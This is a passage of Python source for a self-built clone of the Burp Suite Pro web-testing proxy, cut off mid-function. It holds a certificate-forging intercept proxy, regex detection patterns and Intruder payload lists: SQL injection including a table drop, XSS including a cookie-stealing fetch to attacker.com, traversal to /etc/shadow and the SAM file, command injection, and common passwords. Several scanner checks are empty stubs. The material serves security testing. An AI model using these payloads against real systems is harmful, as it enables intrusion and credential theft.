# ================= IMPROVED BURP SUITE PRO CLONE =================
# File: burp_pro_advanced.py

import socket
import ssl
import threading
import os
import time
import json
import re
import sqlite3
import hashlib
import base64
import gzip
from pathlib import Path
import zlib
import urllib.parse
import csv
import requests
import uuid
import html
from datetime import datetime, timedelta, timezone
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from flask import Flask, request, jsonify, render_template_string, send_file, Response, stream_with_context
from functools import lru_cache
from io import StringIO, BytesIO
import secrets
import random
import string
import mimetypes
from typing import Dict, List, Optional, Tuple,Set
import asyncio
import hashlib
import hmac
import struct
from dataclasses import dataclass, asdict
import xml.etree.ElementTree as ET
import xml.dom.minidom
import pickle
from collections import defaultdict, Counter
import statistics
import math
import itertools

# ================= CONFIG =================
PROXY_PORT = 8080
UI_PORT = 8081
CERT_DIR = "certs"
CA_CERT = Path("yettie_ca.crt")
CA_KEY = Path("yettie_ca.key")

DB_FILE = "burp_pro_advanced.db"
PROJECTS_DIR = "projects"
LOG_DIR = "logs"
TEMP_DIR = "temp"
os.makedirs(CERT_DIR, exist_ok=True)
os.makedirs(PROJECTS_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(TEMP_DIR, exist_ok=True)

STOP_EVENT = threading.Event()

# ================= DATABASE SETUP =================
import threading
from contextlib import contextmanager


class ThreadSafeDB:
    """Thread-safe database connection pool"""

    def __init__(self, db_path):
        self.db_path = db_path
        self.local = threading.local()
        self._init_db()

    def _init_db(self):
        """Initialize the database schema"""
        conn = sqlite3.connect(self.db_path, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        # Extended database schema (same as before)
        cur.execute("""CREATE TABLE IF NOT EXISTS requests(
            id TEXT PRIMARY KEY,
            timestamp TEXT,
            method TEXT,
            scheme TEXT,
            host TEXT,
            port INTEGER,
            path TEXT,
            query TEXT,
            fragment TEXT,
            headers TEXT,
            body BLOB,
            response_code INTEGER,
            response_headers TEXT,
            response_body BLOB,
            response_time REAL,
            request_size INTEGER,
            response_size INTEGER,
            notes TEXT,
            tags TEXT,
            project TEXT,
            bookmarked INTEGER DEFAULT 0,
            highlighted INTEGER DEFAULT 0,
            mime_type TEXT,
            edited INTEGER DEFAULT 0,
            comment TEXT
        )""")

        # ... (all other CREATE TABLE statements remain the same)

        conn.commit()
        conn.close()

    @property
    def connection(self):
        """Get thread-local database connection"""
        if not hasattr(self.local, 'conn'):
            self.local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.local.conn.row_factory = sqlite3.Row
        return self.local.conn

    @contextmanager
    def cursor(self):
        """Context manager for database cursor"""
        conn = self.connection
        cur = conn.cursor()
        try:
            yield cur
            conn.commit()
        except Exception as e:
            conn.rollback()
            raise e

    def close(self):
        """Close all connections"""
        if hasattr(self.local, 'conn'):
            self.local.conn.close()
            del self.local.conn


# Create thread-safe database instance
DB = ThreadSafeDB(DB_FILE)


# ================= GLOBAL STATE =================
class GlobalState:
    def __init__(self):
        self.intercept_queue = {}
        self.active_project = {"name": "Default", "scope": []}
        self.intercept_enabled = True
        self.scope_rules = []
        self.macros = {}
        self.project_settings = {}
        self.user_settings = {
            "theme": "light",
            "proxy_listen": "127.0.0.1",
            "auto_scroll": True,
            "show_images": False,
            "highlight_color": "#ff6b6b"
        }
        self.repeater_tabs = {}
        self.intruder_attack_types = {
            "sniper": "Sniper",
            "battering_ram": "Battering Ram",
            "pitchfork": "Pitchfork",
            "cluster_bomb": "Cluster Bomb"
        }
        self.vulnerability_definitions = self._load_vuln_definitions()

    def _load_vuln_definitions(self):
        return {
            "SQL Injection": {
                "severity": "High",
                "description": "SQL injection allows attackers to execute arbitrary SQL commands.",
                "remediation": "Use parameterized queries/prepared statements.",
                "cwe": "CWE-89"
            },
            "Cross-site Scripting (XSS)": {
                "severity": "High",
                "description": "XSS allows attackers to execute scripts in the victim's browser.",
                "remediation": "Implement proper output encoding and input validation.",
                "cwe": "CWE-79"
            },
            "Cross-site Request Forgery (CSRF)": {
                "severity": "Medium",
                "description": "CSRF tricks users into performing unwanted actions.",
                "remediation": "Implement anti-CSRF tokens.",
                "cwe": "CWE-352"
            },
            "Local File Inclusion (LFI)": {
                "severity": "High",
                "description": "LFI allows reading of local files on the server.",
                "remediation": "Validate and sanitize file paths.",
                "cwe": "CWE-22"
            },
            "Remote Code Execution (RCE)": {
                "severity": "Critical",
                "description": "RCE allows arbitrary command execution on the server.",
                "remediation": "Validate and sanitize all inputs.",
                "cwe": "CWE-78"
            },
            "Server-Side Request Forgery (SSRF)": {
                "severity": "High",
                "description": "SSRF allows making requests to internal resources.",
                "remediation": "Validate and restrict URL inputs.",
                "cwe": "CWE-918"
            },
            "XML External Entity (XXE)": {
                "severity": "High",
                "description": "XXE allows reading files and SSRF via XML parsing.",
                "remediation": "Disable external entities in XML parsers.",
                "cwe": "CWE-611"
            },
            "Insecure Direct Object References (IDOR)": {
                "severity": "Medium",
                "description": "IDOR allows accessing objects belonging to other users.",
                "remediation": "Implement proper authorization checks.",
                "cwe": "CWE-639"
            },
            "Security Misconfiguration": {
                "severity": "Medium",
                "description": "Improperly configured security settings.",
                "remediation": "Follow security best practices and harden configuration.",
                "cwe": "CWE-16"
            },
            "Sensitive Data Exposure": {
                "severity": "High",
                "description": "Exposure of sensitive information like passwords, tokens.",
                "remediation": "Encrypt sensitive data and use secure protocols.",
                "cwe": "CWE-319"
            }
        }


GLOBAL = GlobalState()


# ================= CA SETUP =================
class CertificateAuthority:
    def __init__(self):
        self.ca_key, self.ca_cert = self._load_or_create_ca()
        self.cert_cache = {}
        self.cert_store = {}

    def _load_or_create_ca(self):
        try:
            ca_key = serialization.load_pem_private_key(
                open("yettie_ca.key", "rb").read(), None)
            ca_cert = x509.load_pem_x509_certificate(
                open("yettie_ca.crt", "rb").read())
            print("[+] Loaded existing CA certificate")
        except:
            print("[+] Generating new CA certificate")
            ca_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, "Burp Suite Professional CA"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "PortSwigger"),
                x509.NameAttribute(NameOID.COUNTRY_NAME, "GB")
            ])

            ca_cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(ca_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.now(timezone.utc) - timedelta(days=1))
                .not_valid_after(datetime.now(timezone.utc) + timedelta(days=3650))
                .add_extension(
                    x509.BasicConstraints(ca=True, path_length=0),
                    critical=True
                )
                .add_extension(
                    x509.KeyUsage(
                        digital_signature=True,
                        content_commitment=True,
                        key_encipherment=True,
                        data_encipherment=True,
                        key_agreement=True,
                        key_cert_sign=True,
                        crl_sign=True,
                        encipher_only=False,
                        decipher_only=False
                    ),
                    critical=True
                )
                .add_extension(
                    x509.SubjectKeyIdentifier.from_public_key(ca_key.public_key()),
                    critical=False
                )
                .sign(ca_key, hashes.SHA256())
            )

            with open("yettie_ca.key", "wb") as f:
                f.write(ca_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))

            with open("yettie_ca.crt", "wb") as f:
                f.write(ca_cert.public_bytes(serialization.Encoding.PEM))

            print("[+] New CA certificate generated")

        return ca_key, ca_cert

    def get_certificate(self, hostname: str) -> Tuple[str, str]:
        """Get or create certificate for a hostname"""
        if hostname in self.cert_cache:
            return self.cert_cache[hostname]

        # Generate private key
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

        # Generate certificate
        now = datetime.now(timezone.utc)

        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, hostname),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Burp Suite Proxy")
        ])

        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(self.ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(minutes=5))
            .not_valid_after(now + timedelta(days=365))
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(hostname)]),
                critical=False
            )
            .add_extension(
                x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]),
                critical=False
            )
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True,
                    key_encipherment=True,
                    data_encipherment=True
                ),
                critical=True
            )
            .sign(self.ca_key, hashes.SHA256())
        )

        cert_path = f"{CERT_DIR}/{hostname}.crt"
        key_path = f"{CERT_DIR}/{hostname}.key"

        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        with open(key_path, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

        self.cert_cache[hostname] = (cert_path, key_path)
        return cert_path, key_path


CA = CertificateAuthority()


# ================= UTILITIES =================
class RequestParser:
    @staticmethod
    def parse_request(raw: bytes):
        """Parse HTTP request into components"""
        try:
            # Split headers and body
            parts = raw.split(b'\r\n\r\n', 1)
            headers_raw = parts[0]
            body = parts[1] if len(parts) > 1 else b''

            # Parse request line
            header_lines = headers_raw.split(b'\r\n')
            if not header_lines:
                return None

            request_line = header_lines[0].decode('utf-8', errors='ignore')
            method, full_path, version = request_line.split()[:3]

            # Parse URL components
            parsed_url = urllib.parse.urlparse(full_path)
            path = parsed_url.path
            query = parsed_url.query
            fragment = parsed_url.fragment

            # Parse headers
            headers = []
            for line in header_lines[1:]:
                if b': ' in line:
                    key, value = line.split(b': ', 1)
                    headers.append((
                        key.decode('utf-8', errors='ignore'),
                        value.decode('utf-8', errors='ignore')
                    ))

            return {
                'method': method,
                'full_path': full_path,
                'path': path,
                'query': query,
                'fragment': fragment,
                'headers': headers,
                'body': body,
                'version': version
            }
        except Exception as e:
            print(f"Error parsing request: {e}")
            return None

    @staticmethod
    def parse_response(raw: bytes):
        """Parse HTTP response"""
        try:
            parts = raw.split(b'\r\n\r\n', 1)
            headers_raw = parts[0]
            body = parts[1] if len(parts) > 1 else b''

            header_lines = headers_raw.split(b'\r\n')
            if not header_lines:
                return None

            status_line = header_lines[0].decode('utf-8', errors='ignore')
            version, status_code, status_text = status_line.split(' ', 2)
            status_code = int(status_code)

            headers = []
            for line in header_lines[1:]:
                if b': ' in line:
                    key, value = line.split(b': ', 1)
                    headers.append((
                        key.decode('utf-8', errors='ignore'),
                        value.decode('utf-8', errors='ignore')
                    ))

            return {
                'version': version,
                'status_code': status_code,
                'status_text': status_text,
                'headers': headers,
                'body': body
            }
        except Exception as e:
            print(f"Error parsing response: {e}")
            return None

    @staticmethod
    def build_request(parsed):
        """Build HTTP request from parsed components"""
        lines = []
        lines.append(f"{parsed['method']} {parsed['full_path']} {parsed['version']}")

        for key, value in parsed['headers']:
            lines.append(f"{key}: {value}")

        request = '\r\n'.join(lines) + '\r\n\r\n'

        if parsed['body']:
            if isinstance(parsed['body'], str):
                request += parsed['body']
            else:
                request = request.encode() + parsed['body']
                return request

        return request.encode()


class DataProcessor:
    """Process and transform data"""

    @staticmethod
    def encode_base64(data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    @staticmethod
    def decode_base64(data: str) -> str:
        return base64.b64decode(data).decode()

    @staticmethod
    def url_encode(data: str) -> str:
        return urllib.parse.quote(data)

    @staticmethod
    def url_decode(data: str) -> str:
        return urllib.parse.unquote(data)

    @staticmethod
    def html_encode(data: str) -> str:
        return html.escape(data)

    @staticmethod
    def html_decode(data: str) -> str:
        return html.unescape(data)

    @staticmethod
    def hex_encode(data: str) -> str:
        return data.encode().hex()

    @staticmethod
    def hex_decode(data: str) -> str:
        return bytes.fromhex(data).decode()

    @staticmethod
    def gzip_compress(data: str) -> str:
        return base64.b64encode(gzip.compress(data.encode())).decode()

    @staticmethod
    def gzip_decompress(data: str) -> str:
        return gzip.decompress(base64.b64decode(data)).decode()

    @staticmethod
    def rot13(data: str) -> str:
        result = []
        for char in data:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def calculate_hash(data: str, algorithm: str = 'md5') -> str:
        if algorithm == 'md5':
            return hashlib.md5(data.encode()).hexdigest()
        elif algorithm == 'sha1':
            return hashlib.sha1(data.encode()).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(data.encode()).hexdigest()
        elif algorithm == 'sha512':
            return hashlib.sha512(data.encode()).hexdigest()
        else:
            raise ValueError(f"Unknown algorithm: {algorithm}")

    @staticmethod
    def jwt_decode(token: str) -> Dict:
        """Decode JWT token"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {"error": "Invalid JWT format"}

            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.b64decode(parts[1] + '==').decode())

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2]
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def json_beautify(data: str) -> str:
        """Format JSON with indentation"""
        try:
            parsed = json.loads(data)
            return json.dumps(parsed, indent=2)
        except:
            return data

    @staticmethod
    def xml_beautify(data: str) -> str:
        """Format XML with indentation"""
        try:
            dom = xml.dom.minidom.parseString(data)
            return dom.toprettyxml()
        except:
            return data


# ================= VULNERABILITY SCANNER =================
class AdvancedVulnerabilityScanner:
    """Advanced vulnerability scanner with multiple detection techniques"""

    def __init__(self):
        self.patterns = self._load_patterns()
        self.signatures = self._load_signatures()
        self.active_scans = {}

    def _load_patterns(self):
        """Load detection patterns for various vulnerabilities"""
        return {
            'SQL Injection': [
                r"(?i)(union\s+.*select|select\s+.*from)",
                r"(?i)(insert\s+into|update\s+.*set|delete\s+from)",
                r"(?i)(drop\s+table|create\s+table|alter\s+table)",
                r"(?i)(sleep\s*\(\s*\d+\s*\)|benchmark\s*\(|waitfor\s+delay)",
                r"(?i)(or\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+)",
                r"(?i)(--\s*$|#|/\*.*\*/)",
                r"(?i)(exec\s*\(|sp_|xp_|@@version)",
                r"(\%27|\')",
            ],
            'XSS': [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"(onload|onerror|onclick|onmouseover|onfocus)\s*=",
                r"alert\s*\(\s*['\"].*['\"]\s*\)",
                r"<iframe[^>]*>",
                r"<img[^>]*src\s*=\s*[^>]*onerror\s*=",
                r"eval\s*\(|setTimeout\s*\(|setInterval\s*\(",
                r"document\.(cookie|location|write)",
            ],
            'Command Injection': [
                r"(?i)(;|\||&|`|\\$\().*(ls|cat|id|whoami|pwd|echo)",
                r"(?i)(system|exec|shell_exec|passthru|popen|proc_open)\s*\(",
                r"(`|\$\(|\\n)",
            ],
            'Path Traversal': [
                r"\.\./|\.\.\\\\",
                r"/etc/passwd|/etc/shadow|/etc/hosts",
                r"c:\\windows\\system32\\",
                r"(?i)(include|require|require_once|include_once).*[\"']\.\.[\"']",
            ],
            'XXE': [
                r"<!ENTITY",
                r"SYSTEM\s+[\"']",
                r"DOCTYPE\s+\w+\s*\[",
                r"<!DOCTYPE.*ENTITY",
            ],
            'SSRF': [
                r"url\s*=\s*[\"'](http|https|ftp|file|gopher)://",
                r"(localhost|127\.0\.0\.1|192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))",
                r"((https?|ftp|file)://.*@.*)",
            ],
            'File Upload': [
                r"(?i)\.(php|jsp|asp|aspx|pl|py|cgi|sh|exe|dll|bat|cmd)(\.|$)",
                r"Content-Type\s*:\s*.*(php|jsp|asp)",
                r"filename\s*=\s*[\"'].*\.(php|jsp|asp)",
            ],
            'Insecure Deserialization': [
                r"(?i)(serialize|unserialize|ObjectInputStream|readObject)",
                r"(?i)(__destruct|__wakeup|__toString)",
                r"(?i)(pickle|marshal|yaml\.load)",
            ],
            'CORS Misconfiguration': [
                r"Access-Control-Allow-Origin\s*:\s*\*",
                r"Access-Control-Allow-Credentials\s*:\s*true.*Origin\s*:\s*\*",
            ],
            'Information Disclosure': [
                r"(?i)(error|exception|stack\s+trace|at\s+.*\.java)",
                r"(?i)(password|secret|key|token)\s*=\s*[\"'][^\"']*[\"']",
                r"(?i)(api[_-]?key|access[_-]?token|auth[_-]?token)",
            ]
        }

    def _load_signatures(self):
        """Load vulnerability signatures"""
        return {
            'SQLi': self._sql_injection_checks,
            'XSS': self._xss_checks,
            'RCE': self._command_injection_checks,
            'LFI/RFI': self._path_traversal_checks,
            'XXE': self._xxe_checks,
            'SSRF': self._ssrf_checks,
        }

    def scan_request(self, request_data: Dict, response_data: Dict) -> List[Dict]:
        """Scan a single request/response pair for vulnerabilities"""
        findings = []

        # Combine request and response for analysis
        full_context = {
            'request': request_data,
            'response': response_data,
            'combined': self._combine_data(request_data, response_data)
        }

        # Run pattern-based detection
        findings.extend(self._pattern_detection(full_context))

        # Run signature-based detection
        findings.extend(self._signature_detection(full_context))

        # Run behavioral analysis
        findings.extend(self._behavioral_analysis(full_context))

        return findings

    def _pattern_detection(self, context: Dict) -> List[Dict]:
        """Pattern-based vulnerability detection"""
        findings = []
        combined_text = context['combined'].lower()

        for vuln_type, patterns in self.patterns.items():
            for pattern in patterns:
                if re.search(pattern, combined_text, re.IGNORECASE | re.DOTALL):
                    findings.append({
                        'type': vuln_type,
                        'severity': self._get_severity(vuln_type),
                        'confidence': 'Medium',
                        'description': f"Pattern match for {vuln_type}",
                        'evidence': f"Matched pattern: {pattern[:50]}...",
                        'location': 'Request/Response',
                        'remediation': self._get_remediation(vuln_type)
                    })
                    break

        return findings

    def _signature_detection(self, context: Dict) -> List[Dict]:
        """Signature-based vulnerability detection"""
        findings = []

        for sig_name, sig_func in self.signatures.items():
            sig_findings = sig_func(context)
            if sig_findings:
                findings.extend(sig_findings)

        return findings

    def _behavioral_analysis(self, context: Dict) -> List[Dict]:
        """Behavioral analysis for vulnerabilities"""
        findings = []

        # Check for error messages that leak information
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"PostgreSQL.*ERROR",
            r"Microsoft OLE DB Provider",
            r"ODBC Driver",
            r"java\.sql\.SQLException",
            r"System\.Data\.SqlClient\.SqlException",
        ]

        response_text = context['response'].get('body', b'').decode('utf-8', errors='ignore')

        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                findings.append({
                    'type': 'Information Disclosure',
                    'severity': 'Medium',
                    'confidence': 'High',
                    'description': 'Database error message revealed',
                    'evidence': f"Error message found: {pattern}",
                    'location': 'Response',
                    'remediation': 'Configure proper error handling'
                })

        # Check for sensitive headers
        sensitive_headers = [
            'server', 'x-powered-by', 'x-aspnet-version',
            'x-aspnetmvc-version', 'x-backend-server'
        ]

        for header_name, header_value in context['response'].get('headers', []):
            if header_name.lower() in sensitive_headers:
                findings.append({
                    'type': 'Information Disclosure',
                    'severity': 'Low',
                    'confidence': 'High',
                    'description': f'Sensitive header exposed: {header_name}',
                    'evidence': f"{header_name}: {header_value}",
                    'location': 'Response Headers',
                    'remediation': 'Remove or obfuscate server information headers'
                })

        return findings

    def _sql_injection_checks(self, context: Dict) -> List[Dict]:
        """Specialized SQL injection checks"""
        findings = []
        request = context['request']

        # Check parameters
        params = self._extract_parameters(request)

        for param_name, param_value in params.items():
            # Time-based SQLi check payloads
            time_payloads = [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "';WAITFOR DELAY '0:0:5'--"
            ]

            # Boolean-based SQLi check payloads
            bool_payloads = [
                "' OR '1'='1",
                "' OR 'a'='a",
                "\" OR \"1\"=\"1"
            ]

            # Test each payload (in real scanner, this would be sent)
            for payload in time_payloads + bool_payloads:
                if any(keyword in payload.lower() for keyword in ['sleep', 'waitfor', 'benchmark']):
                    # This would be a time-based check
                    pass
                elif any(keyword in payload.lower() for keyword in ['or', 'and']):
                    # This would be a boolean-based check
                    pass

        return findings

    def _xss_checks(self, context: Dict) -> List[Dict]:
        """Specialized XSS checks"""
        findings = []
        request = context['request']
        response = context['response']

        # Check if user input is reflected in response
        params = self._extract_parameters(request)
        response_text = response.get('body', b'').decode('utf-8', errors='ignore')

        for param_name, param_value in params.items():
            if param_value and param_value in response_text:
                # Input is reflected - potential XSS
                findings.append({
                    'type': 'Reflected XSS',
                    'severity': 'Medium',
                    'confidence': 'Low',
                    'description': f'User input reflected in response: {param_name}',
                    'evidence': f"Parameter '{param_name}' value '{param_value[:50]}...' found in response",
                    'location': f'Parameter: {param_name}',
                    'remediation': 'Implement proper output encoding'
                })

        return findings

    def _command_injection_checks(self, context: Dict) -> List[Dict]:
        """Command injection checks"""
        return []

    def _path_traversal_checks(self, context: Dict) -> List[Dict]:
        """Path traversal checks"""
        return []

    def _xxe_checks(self, context: Dict) -> List[Dict]:
        """XXE checks"""
        return []

    def _ssrf_checks(self, context: Dict) -> List[Dict]:
        """SSRF checks"""
        return []

    def _combine_data(self, request: Dict, response: Dict) -> str:
        """Combine request and response data for scanning"""
        combined = []

        # Add request line
        if 'method' in request and 'full_path' in request:
            combined.append(f"{request['method']} {request['full_path']}")

        # Add request headers
        for key, value in request.get('headers', []):
            combined.append(f"{key}: {value}")

        # Add request body if text
        if request.get('body'):
            try:
                combined.append(request['body'].decode('utf-8', errors='ignore'))
            except:
                pass

        # Add response line
        if 'status_code' in response and 'status_text' in response:
            combined.append(f"HTTP {response['status_code']} {response['status_text']}")

        # Add response headers
        for key, value in response.get('headers', []):
            combined.append(f"{key}: {value}")

        # Add response body if text
        if response.get('body'):
            try:
                combined.append(response['body'].decode('utf-8', errors='ignore'))
            except:
                pass

        return '\n'.join(combined)

    def _extract_parameters(self, request: Dict) -> Dict:
        """Extract parameters from request"""
        params = {}

        # Extract from query string
        if 'query' in request and request['query']:
            query_params = urllib.parse.parse_qs(request['query'])
            for key, values in query_params.items():
                params[key] = values[0]

        # Extract from POST body if applicable
        if request.get('method') == 'POST':
            content_type = None
            for key, value in request.get('headers', []):
                if key.lower() == 'content-type':
                    content_type = value.lower()
                    break

            if content_type and 'application/x-www-form-urlencoded' in content_type:
                if request.get('body'):
                    try:
                        body_params = urllib.parse.parse_qs(request['body'].decode())
                        for key, values in body_params.items():
                            params[key] = values[0]
                    except:
                        pass
            elif content_type and 'application/json' in content_type:
                if request.get('body'):
                    try:
                        json_data = json.loads(request['body'].decode())
                        # Flatten JSON
                        self._flatten_json(json_data, '', params)
                    except:
                        pass

        return params

    def _flatten_json(self, data, prefix, result):
        """Flatten JSON structure"""
        if isinstance(data, dict):
            for key, value in data.items():
                new_prefix = f"{prefix}.{key}" if prefix else key
                self._flatten_json(value, new_prefix, result)
        elif isinstance(data, list):
            for i, value in enumerate(data):
                new_prefix = f"{prefix}[{i}]"
                self._flatten_json(value, new_prefix, result)
        else:
            result[prefix] = str(data)

    def _get_severity(self, vuln_type: str) -> str:
        """Get severity level for vulnerability type"""
        severity_map = {
            'SQL Injection': 'High',
            'XSS': 'High',
            'Command Injection': 'Critical',
            'Path Traversal': 'High',
            'XXE': 'High',
            'SSRF': 'High',
            'File Upload': 'Medium',
            'Insecure Deserialization': 'High',
            'CORS Misconfiguration': 'Low',
            'Information Disclosure': 'Medium'
        }
        return severity_map.get(vuln_type, 'Medium')

    def _get_remediation(self, vuln_type: str) -> str:
        """Get remediation advice for vulnerability type"""
        remediation_map = {
            'SQL Injection': 'Use parameterized queries or prepared statements',
            'XSS': 'Implement proper output encoding and input validation',
            'Command Injection': 'Validate and sanitize all user inputs',
            'Path Traversal': 'Implement proper file path validation',
            'XXE': 'Disable external entity processing in XML parsers',
            'SSRF': 'Validate and sanitize URL inputs',
            'File Upload': 'Restrict file types and scan uploaded files',
            'Information Disclosure': 'Configure proper error handling'
        }
        return remediation_map.get(vuln_type, 'Review and fix based on vulnerability type')


# ================= INTRUDER ENGINE =================
class IntruderEngine:
    """Advanced intruder engine for automated attacks with thread-safe database operations"""

    def __init__(self):
        self.active_jobs = {}
        self.payload_sets = self._load_payload_sets()
        self.grep_strings = []
        self.lock = threading.Lock()  # For thread-safe operations on active_jobs
        self.request_engine = self._create_request_engine()

    def _create_request_engine(self):
        """Create HTTP request engine for sending attacks"""

        class RequestEngine:
            def __init__(self):
                self.session = requests.Session()
                self.session.verify = False  # For testing, allow self-signed certs
                self.session.timeout = 30

            def send_request(self, method, url, headers=None, data=None, allow_redirects=True):
                """Send HTTP request with error handling"""
                try:
                    response = self.session.request(
                        method=method,
                        url=url,
                        headers=headers or {},
                        data=data,
                        allow_redirects=allow_redirects
                    )
                    return {
                        'status_code': response.status_code,
                        'headers': dict(response.headers),
                        'body': response.content,
                        'response_time': response.elapsed.total_seconds(),
                        'size': len(response.content),
                        'history': [{
                            'url': r.url,
                            'status_code': r.status_code
                        } for r in response.history]
                    }
                except requests.exceptions.RequestException as e:
                    return {
                        'error': str(e),
                        'status_code': 0,
                        'body': b'',
                        'response_time': 0,
                        'size': 0
                    }

        return RequestEngine()

    def _load_payload_sets(self):
        """Load predefined payload sets with categorization"""
        return {
            'SQL Injection': {
                'description': 'SQL injection payloads for various databases',
                'payloads': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "' AND 1=1--",
                    "' OR 1=1--",
                    "'; DROP TABLE users--",
                    "' OR 'a'='a",
                    "' OR 1=1#",
                    "' OR '1'='1'--",
                    "' OR 1=1/*",
                    "admin'--",
                    "' OR EXISTS(SELECT * FROM users)--",
                    "' WAITFOR DELAY '0:0:5'--",
                    "' UNION SELECT username, password FROM users--"
                ],
                'tags': ['sqli', 'database']
            },
            'XSS': {
                'description': 'Cross-site scripting payloads',
                'payloads': [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "\"><script>alert(1)</script>",
                    "javascript:alert(1)",
                    "onload=alert(1)",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "'\"><script>alert(document.cookie)</script>",
                    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
                ],
                'tags': ['xss', 'client-side']
            },
            'Path Traversal': {
                'description': 'Directory traversal and LFI payloads',
                'payloads': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "../../../../etc/shadow",
                    "....//....//etc/passwd",
                    "/etc/passwd%00",
                    "C:\\Windows\\System32\\config\\SAM",
                    "....\\....\\windows\\win.ini",
                    "/proc/self/environ",
                    "/var/www/html/config.php"
                ],
                'tags': ['lfi', 'directory-traversal']
            },
            'OS Command': {
                'description': 'Command injection payloads',
                'payloads': [
                    "; ls",
                    "| id",
                    "`whoami`",
                    "$(id)",
                    "; cat /etc/passwd",
                    "| dir",
                    "`ls -la`",
                    "; ping -c 1 localhost",
                    "| netstat -an",
                    "`ipconfig /all`"
                ],
                'tags': ['rce', 'command-injection']
            },
            'Numbers': {
                'description': 'Numeric payloads for ID enumeration',
                'payloads': [str(i) for i in range(1, 101)],
                'tags': ['enumeration', 'ids']
            },
            'Fuzz': {
                'description': 'Special characters for fuzzing',
                'payloads': [
                    "'", "\"", ";", "--", "#", "/*", "*/", "@@",
                    "||", "&&", "|", "&", "^", "%", "*", "=",
                    "<", ">", "!", "~", "(", ")", "[", "]",
                    "{", "}", "\\", "/", "?", ":", "+", "-"
                ],
                'tags': ['fuzzing', 'special-chars']
            },
            'Common Passwords': {
                'description': 'Common passwords for brute force',
                'payloads': [
                    "admin", "password", "123456", "qwerty", "letmein",
                    "welcome", "monkey", "password1", "abc123", "superman",
                    "iloveyou", "123123", "admin123", "test", "1234"
                ],
                'tags': ['bruteforce', 'passwords']
            }
        }

    def create_job(self, config: Dict) -> Dict:
        """Create a new intruder job with validation"""
        try:
            # Validate required fields
            if not config.get('target_url'):
                raise ValueError("Target URL is required")

            # Parse and validate URL
            try:
                parsed_url = urllib.parse.urlparse(config['target_url'])
                if not parsed_url.scheme or not parsed_url.netloc:
                    raise ValueError("Invalid URL format")
            except Exception as e:
                raise ValueError(f"Invalid URL: {str(e)}")

            # Generate job ID
            job_id = str(uuid.uuid4())

            # Prepare job configuration
            job = {
                'id': job_id,
                'name': config.get('name', f'Attack {datetime.now().strftime("%Y%m%d_%H%M%S")}'),
                'status': 'Created',
                'target_url': config['target_url'],
                'method': config.get('method', 'GET').upper(),
                'headers': self._normalize_headers(config.get('headers', [])),
                'body_template': config.get('body_template', ''),
                'payload_type': config.get('payload_type', 'Custom'),
                'payloads': self._prepare_payloads(config),
                'attack_type': config.get('attack_type', 'sniper'),
                'grep_strings': config.get('grep_strings', []),
                'extract_grep': config.get('extract_grep', []),
                'progress': 0,
                'results': [],
                'created': datetime.now(timezone.utc).isoformat(),
                'updated': datetime.now(timezone.utc).isoformat(),
                'project': GLOBAL.active_project['name'],
                'stats': {
                    'total': 0,
                    'sent': 0,
                    'successful': 0,
                    'failed': 0,
                    'average_time': 0
                }
            }

            # Calculate total payloads based on attack type
            job['stats']['total'] = self._calculate_total_payloads(job)

            # Validate attack configuration
            self._validate_attack_config(job)

            with self.lock:
                self.active_jobs[job_id] = job

            # Save to database with thread-safe connection
            self._save_job_to_db(job)

            return {
                'success': True,
                'job_id': job_id,
                'message': f"Job '{job['name']}' created successfully",
                'stats': job['stats']
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'message': f"Failed to create job: {str(e)}"
            }

    def _normalize_headers(self, headers):
        """Normalize headers to list of tuples"""
        normalized = []
        if isinstance(headers, dict):
            for key, value in headers.items():
